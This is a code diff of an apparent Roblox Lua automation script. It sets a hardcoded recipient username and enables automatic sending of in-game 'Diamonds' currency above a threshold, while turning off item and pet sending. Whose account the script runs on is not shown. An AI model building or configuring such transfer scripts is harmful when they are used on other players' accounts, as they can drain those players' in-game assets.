@@ -1,11 +1,11 @@
-PAUSE_or_SEND = "p"
-NAME_USER_SEND = ""
+PAUSE_or_SEND = "s"
+NAME_USER_SEND = "IsaacSlimeBacon2023"
 
 local SETTINGS_SENT_CURRENCY = {
 	["Diamonds"] = {
 		Class = "Currency",
 		Id = "Diamonds",
-		MinAmount = "50b",
+		MinAmount = "51b",
 		KeepAmount = "50m",
 	},
 }
@@ -366,14 +366,14 @@ end
 
 task.spawn(function()
 	task.wait(1)
-	--sendConfiguredCurrencies()
+	sendConfiguredCurrencies()
 end)
 	task.wait(2)
 task.spawn(function()
-	sendConfiguredItems()
+	--sendConfiguredItems()
 end)
 	task.wait(2)
 task.spawn(function()
 	task.wait(20)
-	sendConfiguredPets()
+	--sendConfiguredPets()
 end)
